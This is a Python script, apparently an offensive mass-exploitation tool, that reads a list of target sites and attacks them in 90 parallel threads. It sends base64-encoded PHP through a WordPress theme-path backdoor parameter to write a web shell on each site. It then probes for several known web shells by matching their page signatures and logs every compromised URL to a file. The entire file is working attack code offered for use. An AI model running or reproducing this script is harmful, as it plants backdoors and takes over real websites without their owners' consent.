import requests
import random
import string
import base64
import sys
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN

banner = '''{FlashKiss}                                                                                             
\n'''.format(fr)
print(banner)
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('/')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

class Eval:
    def __init__(self):
        self.headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                        'referer': 'www.google.com'}

        self.shell_content = """<?php echo "Black Bot";?>"""

    def url_domain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        else:
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern, site):
            sitez = re.findall(pattern, site)
            site = sitez[0]
        return site

    def ran(self, length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def ba_blue(self, site):
        try:
            url = "http://" + self.url_domain(site)
            filename = "blk" + self.ran(5) + ".php"
            backdoors = 'echo \'Black Bot\';fwrite(fopen(\'{}\',\'w+\'),\'{}\');'.format(filename, self.shell_content)
            encoded_php = base64.b64encode(backdoors.encode()).decode()
            response = requests.get(url + "/wp-admin/css/colors/blue/blue.php?wall=" + encoded_php, headers=self.headers).content.decode()
            if 'Black Bot' in response:
                print("Target:{} {} Success Vulnerability ".format(url, fg))
                open('Shells.txt', 'a').write(url + "/wp-admin/css/colors/blue/" + filename + "\n")
            else:
                print("Target:{} {} Not Vulnerability ".format(url, fr))
        except:
            pass

code_shell = Eval()

def multiblackbot(url):
    try:
        url = 'http://' + code_shell.url_domain(url)
        check = requests.get(url + '/simple.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if '{Shells-Shell}' in check.content.decode():
            print(' ◕‿◕ ' + url + ' --> {}[GOOD]'.format(fg))
            open('Shell.txt', 'a').write(url + '/simple.php\n')
        else:
            url = 'https://' + code_shell.url_domain(url)
            check = requests.get(url + '/xxl.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
            if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check.content.decode():
                print(' ◕‿◕ ' + url + ' --> {}[GOOD]'.format(fg))
                open('Shells.txt', 'a').write(url + '/xxl.php\n')
            else:
                print(' ◕‿◕ ' + url + ' --> {}[Failed]'.format(fr))
                url = 'http://' + code_shell.url_domain(url)
        check = requests.get(url + '/class.api.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if '%PDF-0-1<form action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"' in check.content.decode():
            print(' ◕‿◕ ' + url + ' --> {}[GOOD]'.format(fg))
            open('Shells.txt', 'a').write(url + '/class.api.php\n')
        else:
            url = 'https://' + code_shell.url_domain(url)
            check = requests.get(url + '/shell20211028.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
            if 'Uname:' in check.content.decode():
                print(' ◕‿◕ ' + url + ' --> {}[GOOD]'.format(fg))
                open('Shells.txt', 'a').write(url + '/shell20211028.php\n')
            else:
                print(' ◕‿◕ ' + url + ' --> {}[Failed]'.format(fr))
    except:
        print(' ◕‿◕ ' + url + ' --> {}[Failed]'.format(fr))



def run_exp(url):
    try:
        code_shell.ba_blue(url)
        multiblackbot(url)

    except:
        pass

mp = Pool(90)
mp.map(run_exp, target)
mp.close()
mp.join()
